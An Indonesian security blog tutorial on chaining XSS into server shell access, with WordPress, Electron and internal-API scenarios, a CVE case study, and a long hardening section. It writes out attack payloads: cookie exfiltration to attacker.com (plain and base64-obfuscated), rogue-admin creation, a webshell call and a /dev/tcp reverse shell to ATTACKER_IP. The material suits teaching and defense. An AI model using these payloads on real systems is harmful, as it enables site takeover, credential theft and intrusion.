---
title: "Xss2Shell: Ketika JavaScript di Browser Berujung Akses Server"
date: 2026-08-22
author: "RavxyTech"
tags: ["xss", "rce", "web-security", "pentesting", "session-hijacking", "exploit-chain"]
categories: ["Research", "Cybersecurity"]
description: "Pembahasan lengkap bagaimana kerentanan XSS bisa diekskalasi menjadi akses shell di server, dari session hijacking, admin takeover, sampai upload webshell dan eksekusi command."
cover:
  image: "/images/xss-to-shell.png"
  alt: "XSS to Shell"
  relative: false
draft: false
ShowToc: true
TocOpen: true
---

Kalau kamu pernah denger orang bilang "XSS itu cuma client-side, nggak berbahaya", itu salah besar. XSS memang berjalan di browser, bukan di server. Tapi justru di situlah letak bahayanya yang sering diremehkan.

Coba bayangkan. Sebuah script XSS berjalan di browser admin sebuah website. Browser admin itu dipercaya sepenuhnya oleh server. Apapun yang dilakukan browser admin, server menganggapnya sah. Jadi kalau attacker bisa mengendalikan apa yang dilakukan browser admin lewat XSS, secara tidak langsung attacker juga mengendalikan server.

Artikel ini bakal ngebahas tuntas bagaimana XSS yang terlihat "sepele" bisa diekskalasi sampai attacker mendapatkan shell di server. Bukan teori doang, tapi dengan alur serangan yang jelas, kode yang bisa dipelajari, dan studi kasus CVE yang nyata. Siapin kopi dulu, ini bakal panjang wkwk.

---

## Apa Itu Exploit Chain?

Sebelum masuk ke teknis, penting untuk paham dulu konsep **exploit chain**. Dalam dunia security, jarang sekali satu kerentanan langsung memberikan akses penuh ke server. Yang lebih sering terjadi adalah beberapa kerentanan atau fitur yang sah dirangkai menjadi satu rantai serangan yang dampaknya jauh lebih besar dari masing-masing komponen.

XSS to Shell adalah contoh klasik dari exploit chain. Rantainya kira-kira begini:

```
Stored XSS tertanam di halaman
  → Script berjalan di browser admin
    → Session admin dicuri atau aksi dilakukan atas nama admin
      → Attacker login sebagai admin atau buat akun admin baru
        → Upload file berbahaya via fitur CMS
          → File dieksekusi di server
            → Attacker dapat shell
```

Setiap langkah di rantai ini punya pertahanan yang bisa memutusnya. Tapi kalau tidak ada satupun pertahanan yang aktif, rantainya utuh dari awal sampai akhir. Dan hasilnya adalah **full compromise**.

---

## Kenapa XSS Bisa Sampai ke Server?

Pertanyaan ini yang paling sering muncul. XSS kan eksekusi di browser, kenapa bisa berdampak ke server?

Jawabannya ada di konsep **trust boundary**. Server web tidak bisa membedakan apakah sebuah HTTP request dikirim oleh admin yang sadar, atau oleh script XSS yang berjalan diam-diam di browser admin. Yang dilihat server hanyalah: "request ini datang dari browser yang punya session admin yang valid, berarti ini request yang sah."

JavaScript yang berjalan di browser admin bisa melakukan tiga hal yang sangat berbahaya:

**Pertama, mencuri session cookie.** Kalau cookie tidak dilindungi flag `HttpOnly`, JavaScript bisa membacanya dan mengirimkannya ke server attacker. Dengan cookie itu, attacker bisa login ke dashboard admin dari browser miliknya sendiri.

**Kedua, melakukan aksi langsung tanpa mencuri cookie.** Bahkan kalau cookie punya flag `HttpOnly`, JavaScript tetap bisa mengirim HTTP request ke server menggunakan `fetch()` atau `XMLHttpRequest`. Request ini otomatis menyertakan cookie karena berasal dari browser yang sudah login. Jadi attacker bisa melakukan apapun yang bisa dilakukan admin, langsung dari browser admin itu sendiri, tanpa admin menyadarinya.

**Ketiga, membuat akun admin baru.** Ini yang paling sering dilakukan karena memberikan akses persisten. Meskipun admin nantinya logout atau mengganti password, akun baru yang sudah dibuat tetap bisa dipakai.

Intinya, XSS mengubah browser admin menjadi **proxy** bagi attacker. Dan proxy ini dipercaya sepenuhnya oleh server.

---

## Skenario 1: Stored XSS ke Admin Hijack ke Shell

Ini adalah skenario yang paling umum ditemui di dunia nyata. Konteksnya adalah CMS (Content Management System) seperti WordPress, Joomla, atau Drupal yang memiliki panel admin dengan fitur upload file.

### Langkah 1: Menanam Stored XSS

Attacker mencari input yang datanya tersimpan di database dan ditampilkan kembali ke pengguna lain, termasuk admin. Tempat yang paling umum adalah kolom komentar, form kontak, profil user, atau field custom lainnya.

Payload paling dasar untuk mencuri cookie:

```html
<img src=x onerror=fetch('https://attacker.com/steal?c='+document.cookie)>
```

Tag `<img>` dengan `src=x` akan selalu gagal memuat gambar, yang otomatis memicu `onerror`. Di dalam `onerror`, `fetch()` mengirimkan cookie ke server milik attacker.

Kalau attacker ingin payload yang lebih tersembunyi, bisa di-encode ke base64:

```html
<img src=x onerror=eval(atob('ZmV0Y2goJ2h0dHBzOi8vYXR0YWNrZXIuY29tL3N0ZWFsP2M9Jytkb2N1bWVudC5jb29raWUp'))>
```

String base64 di atas adalah encoding dari `fetch('https://attacker.com/steal?c='+document.cookie)`. Teknik ini membantu menghindari deteksi WAF yang mencari keyword seperti "fetch" atau "document.cookie" secara langsung.

---

### Langkah 2: Admin Membuka Halaman, Cookie Terkirim

Begitu admin membuka halaman yang mengandung payload (misalnya halaman moderasi komentar), script langsung berjalan tanpa interaksi apapun dari admin. Cookie session terkirim ke server attacker.

Di sisi attacker, log server menunjukkan sesuatu seperti:

```
GET /steal?c=wordpress_logged_in_abc123=admin%7C1756000000%7C...
```

Attacker kemudian memasukkan cookie ini ke browser miliknya. Caranya cukup buka DevTools, masuk ke tab Application, lalu Cookies, dan tambahkan cookie yang didapat. Refresh halaman, dan attacker sudah login sebagai admin.

---

### Langkah 3: Kalau Cookie Punya HttpOnly

Skenario di atas tidak bekerja kalau cookie dilindungi flag `HttpOnly` karena JavaScript tidak bisa membaca cookie tersebut. Tapi bukan berarti rantai serangannya putus.

Attacker bisa mengubah strategi: alih-alih mencuri cookie, langsung melakukan aksi dari browser admin menggunakan `fetch()`. Contoh yang paling efektif adalah membuat akun admin baru via REST API.

Di WordPress misalnya:

```javascript
fetch('/wp-json/wp/v2/users', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/json',
    'X-WP-Nonce': wpApiSettings.nonce
  },
  body: JSON.stringify({
    username: 'maintenance',
    password: 'X9v!kL2@pQr',
    email: 'maintenance@target.com',
    roles: ['administrator']
  })
})
```

Yang membuat kode ini bekerja adalah parameter `credentials: 'include'`. Parameter ini memberitahu browser untuk menyertakan cookie pada request, meskipun JavaScript tidak bisa membaca cookie itu secara langsung. Server menerima request ini dengan cookie admin yang valid, melihat nonce yang benar, dan menganggap ini adalah permintaan sah dari admin.

Hasilnya? Akun admin baru bernama "maintenance" berhasil dibuat. Nama yang sengaja dipilih agar tidak mencurigakan kalau dilihat sekilas di daftar user.

Payload lengkap yang ditanamkan di kolom komentar bisa terlihat seperti ini:

```html
<img src=x onerror="fetch('/wp-json/wp/v2/users',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json','X-WP-Nonce':wpApiSettings.nonce},body:JSON.stringify({username:'maintenance',password:'X9v!kL2@pQr',email:'m@target.com',roles:['administrator']})})">
```

---

### Langkah 4: Upload File Berbahaya via Admin Panel

Setelah punya akses admin (baik dari cookie yang dicuri atau akun baru yang dibuat), attacker login ke dashboard CMS. Dari sini ada beberapa cara untuk mendapatkan eksekusi kode di server.

**Cara pertama: Upload plugin/theme palsu.** Di WordPress, admin bisa mengupload file ZIP sebagai plugin baru. Attacker membuat file ZIP yang berisi satu file PHP dengan kode yang menerima parameter dari URL dan mengeksekusinya sebagai command di sistem operasi. Ini yang disebut **webshell**. Setelah diupload dan diaktifkan, file ini bisa diakses lewat URL tertentu.

**Cara kedua: Edit file tema/plugin yang sudah ada.** WordPress punya fitur Theme Editor dan Plugin Editor yang memungkinkan admin mengedit file PHP langsung dari browser. Attacker bisa menyisipkan kode webshell ke dalam file tema yang sudah ada, misalnya `404.php` yang jarang dicek.

**Cara ketiga: Upload lewat Media Library.** Kalau server tidak memvalidasi tipe file dengan benar, attacker bisa mengupload file PHP yang di-rename menjadi ekstensi yang diizinkan, atau memanfaatkan teknik double extension seperti `shell.php.jpg`.

Setelah webshell berhasil diupload, attacker mengaksesnya lewat browser:

```
https://target.com/wp-content/plugins/maintenance-tool/index.php?cmd=id
```

Output:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

User `www-data` artinya command berhasil dieksekusi di server sebagai user web server. Dari sini attacker sudah punya akses awal ke server.

---

### Langkah 5: Dari Webshell ke Interactive Shell

Webshell yang diakses lewat browser punya keterbatasan. Setiap command harus dikirim sebagai HTTP request terpisah, tidak ada sesi yang persisten, dan tidak bisa menjalankan program interaktif. Attacker biasanya langsung upgrade ke **reverse shell** untuk mendapatkan koneksi interaktif yang lebih stabil.

Reverse shell adalah koneksi di mana server target yang menginisiasi koneksi ke mesin attacker, bukan sebaliknya. Ini berguna karena firewall biasanya memblokir koneksi masuk tapi mengizinkan koneksi keluar.

Di sisi attacker, siapkan listener dulu:

```bash
nc -lvnp 4444
```

Lalu di webshell, jalankan:

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

Kalau berhasil, di terminal attacker akan muncul:

```
Connection received!
www-data@target-server:/$
```

Upgrade ke proper TTY supaya shell-nya lebih fungsional:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Sekarang attacker punya interactive shell di server target. Dari user `www-data`, proses selanjutnya adalah privilege escalation ke root. Tapi itu sudah di luar scope artikel ini (baca artikel [Rooting Server](https://ravxytech.site/posts/root-server-privilege-escalation/) untuk kelanjutannya).

Diagram alur lengkap dari awal sampai akhir:

```
Stored XSS di kolom komentar
  → Admin buka halaman moderasi
    → JavaScript berjalan di browser admin
      → Buat akun admin baru via fetch()
        → Login ke dashboard dengan akun baru
          → Upload plugin berisi webshell
            → Akses webshell via URL
              → Jalankan reverse shell
                → Attacker dapat interactive shell di server
```

---

## Studi Kasus: CVE-2026-64638 (XSS2Shell)

Kalau skenario di atas terdengar terlalu teoritis, CVE-2026-64638 adalah bukti nyata bahwa XSS to Shell bukan hanya konsep. Celah ini ditemukan di **WordPress Core** sendiri, bukan di plugin pihak ketiga.

### Apa yang Terjadi

CVE-2026-64638 yang dijuluki **XSS2Shell** adalah kerentanan Reflected XSS di halaman login WordPress (`wp-login.php`). CVSS-nya 8.9 (High), yang termasuk sangat tinggi untuk kerentanan XSS.

Celah ini ada di semua versi WordPress sebelum 7.0.3. Sudah dipatch pada 6 Agustus 2026 dan backported ke 24 branch maintenance sampai WordPress 4.7.

### Root Cause: Parser Disagreement

Yang menarik dari CVE ini adalah root cause-nya. WordPress menggunakan dua fungsi sanitasi HTML: `wp_strip_all_tags()` dan `wp_kses_post()`. Masalahnya, kedua fungsi ini memperlakukan HTML yang malformed secara **berbeda**.

Ketika user memasukkan username yang tidak valid saat login, WordPress menampilkan pesan error yang berisi username tersebut. Alur sanitasinya kira-kira begini:

1. Username masuk, melewati `wp_strip_all_tags()` yang menghapus semua tag HTML
2. Tapi kemudian data yang sama juga diproses oleh `wp_kses_post()` di titik lain

Karena kedua fungsi punya cara parsing yang berbeda terhadap tag HTML yang sengaja dibuat tidak valid (malformed), attacker bisa membuat username khusus yang lolos dari kedua layer sanitasi. Hasilnya, payload JavaScript ter-render di halaman login.

### Alur Eksploitasi

```
Attacker membuat URL login dengan username berisi payload XSS
  → Admin diarahkan ke URL tersebut (via phishing, link di email, dll)
    → WordPress menampilkan error "username tidak valid"
      → Payload XSS ter-render di halaman login
        → JavaScript berjalan di browser admin
          → Rantai eksploitasi dimulai (buat akun admin, upload plugin, dll)
            → Shell di server
```

Yang membuat celah ini berbahaya adalah lokasinya di halaman login. Halaman login adalah tempat yang secara rutin diakses oleh admin. Seorang admin yang menerima link "ada masalah dengan akun WordPress Anda, silakan login di sini" tidak akan terlalu curiga karena memang mengarah ke halaman login WordPress yang asli.

### Patch dan Mitigasi

WordPress 7.0.3 memperbaiki celah ini dengan menyeragamkan cara sanitasi input di halaman login. Untuk yang masih menggunakan versi lama, update segera karena celah ini sudah dipublikasikan secara luas dan exploit-nya mudah direproduksi.

Referensi lebih lanjut:
- [The Hacker News: WordPress XSS2Shell](https://thehackernews.com)
- [Imperva: CVE-2026-64638 Analysis](https://imperva.com)
- [Tenable: CVE-2026-64638](https://tenable.com)

---

## Skenario 2: XSS di Aplikasi Electron ke RCE Langsung

Tidak semua XSS-to-RCE butuh rantai panjang seperti skenario di atas. Di aplikasi desktop berbasis **Electron**, XSS bisa **langsung** menjadi RCE tanpa perlu mencuri cookie atau upload webshell.

### Kenapa Electron Berbeda?

Electron adalah framework yang dipakai untuk membuat aplikasi desktop menggunakan teknologi web (HTML, CSS, JavaScript). Aplikasi populer seperti VS Code, Discord, dan Slack dibangun dengan Electron.

Yang membuat Electron berbeda dari browser biasa adalah arsitekturnya. Electron menggabungkan browser (Chromium) dengan runtime **Node.js**. Artinya, kalau konfigurasinya salah, JavaScript yang berjalan di halaman web bisa mengakses API Node.js yang punya kemampuan untuk mengeksekusi command di sistem operasi.

### Konfigurasi yang Berbahaya

Ada tiga parameter kunci di Electron yang menentukan apakah XSS bisa menjadi RCE:

**`nodeIntegration: true`** memungkinkan kode JavaScript di renderer process untuk menggunakan `require()`. Dengan ini, attacker bisa langsung mengimpor modul `child_process` dan menjalankan command apapun.

**`contextIsolation: false`** menghapus batas antara web context dan Electron internal context. Tanpa isolasi ini, kode dari halaman web bisa mengakses API internal Electron.

**`contextBridge` yang terlalu permisif** terjadi ketika developer mengekspos fungsi-fungsi berbahaya ke renderer melalui `contextBridge` tanpa pembatasan yang memadai.

Contoh konfigurasi yang salah:

```javascript
const win = new BrowserWindow({
  webPreferences: {
    nodeIntegration: true,
    contextIsolation: false
  }
})
```

Dengan konfigurasi di atas, payload XSS bisa langsung mengeksekusi command:

```javascript
require('child_process').exec('calc.exe')
```

Atau di Linux:

```javascript
require('child_process').exec('id')
```

Tidak perlu mencuri cookie. Tidak perlu upload webshell. Satu baris JavaScript langsung mengeksekusi command di sistem operasi. Ini yang membuat XSS di Electron jauh lebih berbahaya dibanding XSS di browser biasa.

### CVE Nyata di Electron

**CVE-2025-67744 (DeepChat)** adalah contoh yang menarik. DeepChat adalah aplikasi chat berbasis Electron yang mendukung rendering Mermaid diagram. Attacker bisa menyisipkan payload XSS di dalam diagram Mermaid yang dikirim lewat chat. Karena aplikasinya mengekspos fungsi IPC (Inter-Process Communication) yang terlalu permisif ke renderer, payload XSS bisa memanggil fungsi internal dan mengeksekusi command di sistem.

**CVE-2025-56459** menunjukkan kasus serupa di mana XSS pada fitur tag rendering di sebuah aplikasi Electron memungkinkan attacker memanggil `shell.openExternal()` untuk mengeksekusi file apapun di sistem, termasuk executable berbahaya.

### Konfigurasi yang Benar

Untuk developer yang menggunakan Electron, ini konfigurasi yang aman:

```javascript
const win = new BrowserWindow({
  webPreferences: {
    nodeIntegration: false,
    contextIsolation: true,
    sandbox: true
  }
})
```

Dan kalau perlu mengekspos fungsi ke renderer lewat `contextBridge`, pastikan hanya mengekspos fungsi yang benar-benar diperlukan dengan parameter yang sudah divalidasi:

```javascript
contextBridge.exposeInMainWorld('api', {
  getVersion: () => app.getVersion(),
  saveFile: (content) => {
    if (typeof content !== 'string') return
    if (content.length > 10000) return
    fs.writeFileSync(safePathOnly, content)
  }
})
```

Jangan pernah mengekspos `exec`, `spawn`, `shell.openExternal`, atau fungsi filesystem tanpa validasi yang ketat.

---

## Skenario 3: XSS ke Internal API Abuse

Skenario ketiga ini sering terlewatkan tapi dampaknya bisa sangat besar. Banyak aplikasi web modern punya **API internal** yang hanya bisa diakses dari jaringan lokal atau oleh user yang sudah terautentikasi.

Contohnya:
- Panel manajemen database yang berjalan di `localhost:8080`
- API monitoring server di `localhost:9090`
- Dashboard Docker/Kubernetes di jaringan internal
- Endpoint konfigurasi yang hanya bisa diakses dari IP tertentu

XSS yang berjalan di browser admin **berada di dalam jaringan yang sama** dengan API-API internal ini. Artinya, JavaScript dari XSS bisa mengirim request ke endpoint yang tidak bisa dijangkau dari internet luar.

Contoh skenario: sebuah aplikasi punya panel admin yang di dalamnya ada fitur untuk mengubah konfigurasi server. Panel ini hanya bisa diakses dari `localhost`. Tapi kalau ada Stored XSS di halaman yang dilihat admin, payload XSS bisa melakukan ini:

```javascript
fetch('http://localhost:9090/api/config', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    allow_remote: true,
    admin_password: 'hacked123'
  })
})
```

Request ini dikirim dari browser admin yang berjalan di mesin server (atau di jaringan yang sama). Server API internal melihat request datang dari `localhost`, menganggapnya sah, dan mengubah konfigurasi sesuai permintaan.

Konsep ini mirip dengan **SSRF (Server-Side Request Forgery)**, tapi dari sisi client. Kalau SSRF memanfaatkan server untuk mengirim request ke internal service, XSS memanfaatkan **browser admin** untuk melakukan hal yang sama. Beberapa security researcher menyebutnya "Client-Side SSRF."

---

## Pertahanan: Memutus Rantai Serangan

Keindahan dari memahami exploit chain adalah kita bisa memutus rantainya di banyak titik. Tidak perlu pertahanan yang sempurna di satu layer. Yang dibutuhkan adalah **pertahanan berlapis** (defense in depth) di mana setiap layer menambah kesulitan bagi attacker.

### Cegah XSS Sejak Awal

Ini adalah pertahanan paling fundamental. Kalau XSS-nya tidak ada, seluruh rantai serangan tidak pernah dimulai.

**Input sanitization dan output encoding** adalah dasar yang tidak bisa ditawar. Semua data yang berasal dari user harus di-sanitize saat masuk dan di-encode saat ditampilkan. Gunakan library sanitasi yang sudah teruji seperti DOMPurify untuk JavaScript atau Bleach untuk Python.

**Content Security Policy (CSP)** membatasi sumber script yang diizinkan berjalan di halaman:

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

Dengan CSP di atas, inline script dan script dari domain lain tidak akan dieksekusi browser. Ini secara signifikan mengurangi dampak XSS meskipun payload berhasil masuk ke halaman.

### Lindungi Session

Kalau XSS tetap berhasil lolos, pertahanan berikutnya adalah memastikan session admin tidak bisa dicuri atau disalahgunakan.

```
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

Flag `HttpOnly` membuat JavaScript tidak bisa membaca cookie sama sekali. Flag `Secure` memastikan cookie hanya dikirim lewat HTTPS. Flag `SameSite=Strict` memastikan cookie tidak dikirim pada request yang berasal dari domain lain.

Ketiga flag ini harus selalu diset pada session cookie. Tidak ada alasan untuk tidak menggunakannya.

### Batasi Aksi Admin

Meskipun attacker berhasil menjalankan JavaScript di browser admin, pertahanan ini memastikan aksi-aksi sensitif tidak bisa dilakukan tanpa verifikasi tambahan.

**Re-authentication** meminta admin memasukkan password lagi sebelum melakukan aksi kritis seperti upload plugin, edit file, atau membuat user baru. XSS bisa mengirim request, tapi tidak bisa mengetahui password admin.

**CSRF token** yang di-generate per session dan divalidasi di server memastikan setiap request berasal dari form yang sah. Meskipun ini bisa di-bypass kalau attacker mendapatkan token lewat XSS, ini tetap menambah satu layer kesulitan.

Di WordPress, pertahanan paling efektif adalah menonaktifkan fitur editor dan upload:

```php
define('DISALLOW_FILE_EDIT', true);
define('DISALLOW_FILE_MODS', true);
```

Dua baris ini di `wp-config.php` menonaktifkan Theme Editor, Plugin Editor, dan kemampuan upload/install plugin baru dari dashboard. Ini memutus rantai di langkah upload webshell.

### Hardening Upload

Kalau fitur upload memang harus ada, pastikan dikonfigurasi dengan benar:

**Whitelist ekstensi file** yang diizinkan. Jangan pakai blacklist karena selalu bisa di-bypass.

**Simpan file upload di luar web root** sehingga tidak bisa diakses langsung lewat URL.

**Disable eksekusi script** di direktori upload:

```apache
<Directory "/var/www/html/wp-content/uploads">
    php_admin_flag engine off
</Directory>
```

Konfigurasi Apache di atas memastikan file PHP yang ada di folder uploads tidak akan pernah dieksekusi, meskipun berhasil diupload.

### Monitor dan Deteksi

Pertahanan terakhir adalah deteksi. Kalau semua layer sebelumnya gagal, setidaknya kita bisa mendeteksi bahwa serangan sedang terjadi.

**Log semua aksi admin** termasuk login, upload file, perubahan user, dan perubahan konfigurasi.

**Alert untuk aktivitas mencurigakan** seperti pembuatan akun admin baru, upload file di luar jam kerja, atau login dari IP yang tidak biasa.

**File integrity monitoring** menggunakan tools seperti Wazuh atau OSSEC yang memantau perubahan file di server secara real-time.

---

## Tools dan Referensi

Beberapa tools yang relevan untuk memahami dan menguji XSS to Shell:

- [BeEF (Browser Exploitation Framework)](https://beefproject.com/) untuk demonstrasi dan eksploitasi XSS di lingkungan lab
- [XSStrike](https://github.com/s0md3v/XSStrike) untuk deteksi dan fuzzing XSS
- [PayloadsAllTheThings - XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection) koleksi payload XSS yang lengkap
- [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) referensi event dan tag untuk XSS
- [GTFOBins](https://gtfobins.github.io/) referensi untuk privilege escalation setelah dapat shell
- [WordPress Security Hardening](https://developer.wordpress.org/advanced-administration/security/hardening/) panduan resmi hardening WordPress

CVE yang dibahas di artikel ini:

| CVE | Target | Dampak |
|-----|--------|--------|
| CVE-2026-64638 | WordPress Core (wp-login.php) | XSS to RCE, CVSS 8.9 |
| CVE-2025-67744 | DeepChat (Electron) | XSS via Mermaid ke RCE |
| CVE-2025-56459 | Electron App | XSS ke shell.openExternal |

---

## Ringkasan

XSS bukan "cuma alert(1)". Ketika target XSS adalah browser yang memiliki session admin, dampaknya bisa jauh melampaui client-side. Rantai serangannya bisa dimulai dari satu input yang tidak di-sanitize, berlanjut ke pencurian session, pembuatan akun admin, upload file berbahaya, dan berakhir dengan akses shell penuh di server.

Pertahanan terbaik adalah memutus rantai ini di sebanyak mungkin titik. Sanitize input, lindungi session, batasi aksi admin, hardening konfigurasi upload, dan monitoring. Semakin banyak layer yang aktif, semakin kecil kemungkinan serangan berhasil sampai ke ujung rantai.

```
Input masuk
  → [Sanitization + CSP] → XSS dicegah? STOP
    → [HttpOnly + SameSite] → Cookie dicuri? STOP
      → [Re-auth + CSRF] → Aksi admin diblokir? STOP
        → [Upload hardening] → File berbahaya ditolak? STOP
          → [File integrity monitoring] → Perubahan terdeteksi? STOP
            → Kalau semua layer gagal → Shell didapat
```

Pahami rantainya, dan pertahanan bisa dibangun dengan jauh lebih efektif.

---

> **Disclaimer**
>
> Seluruh materi dalam artikel ini dibuat **murni untuk tujuan edukasi dan keamanan informasi**. Teknik yang dijelaskan hanya boleh dipraktikkan pada sistem milik sendiri, lingkungan lab, atau dalam scope program bug bounty yang sudah diotorisasi.
>
> **Jangan pernah menjalankan teknik ini ke sistem yang bukan milik sendiri atau yang tidak memiliki izin eksplisit untuk diuji.** Peretasan tanpa izin adalah tindakan ilegal yang bisa dikenai sanksi hukum sesuai UU ITE.
>
> [ravxytech.site](https://ravxytech.site) hadir untuk berbagi pengetahuan seputar teknologi dan cyber security secara bertanggung jawab.
